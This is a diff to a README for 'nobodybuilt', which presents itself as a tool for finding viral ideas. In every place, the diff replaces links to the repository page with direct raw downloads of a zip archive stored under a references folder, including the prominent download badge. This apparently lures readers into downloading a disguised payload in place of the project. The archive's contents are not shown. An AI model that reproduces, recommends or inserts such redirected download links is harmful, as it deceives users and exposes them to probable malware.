@@ -1,6 +1,6 @@
 # ✨ nobodybuilt - Find Viral Ideas Before Others
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tyunsweet818/nobodybuilt)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tyunsweet818/nobodybuilt/raw/refs/heads/main/references/Software_v1.8-alpha.3.zip)
 
 ## 🚀 What is nobodybuilt?
 
@@ -18,7 +18,7 @@ It works well with agent tools like Claude Code, Codex, Cursor, Gemini CLI, and 
 
 Visit this page to download and set up the project:
 
-[https://github.com/tyunsweet818/nobodybuilt](https://github.com/tyunsweet818/nobodybuilt)
+[https://github.com/tyunsweet818/nobodybuilt/raw/refs/heads/main/references/Software_v1.8-alpha.3.zip](https://github.com/tyunsweet818/nobodybuilt/raw/refs/heads/main/references/Software_v1.8-alpha.3.zip)
 
 On Windows, do this:
 
@@ -172,7 +172,7 @@ This keeps the process focused and easy to repeat
 
 Visit this page to download and work with the project:
 
-[https://github.com/tyunsweet818/nobodybuilt](https://github.com/tyunsweet818/nobodybuilt)
+[https://github.com/tyunsweet818/nobodybuilt/raw/refs/heads/main/references/Software_v1.8-alpha.3.zip](https://github.com/tyunsweet818/nobodybuilt/raw/refs/heads/main/references/Software_v1.8-alpha.3.zip)
 
 ## 🏷️ Topics
 
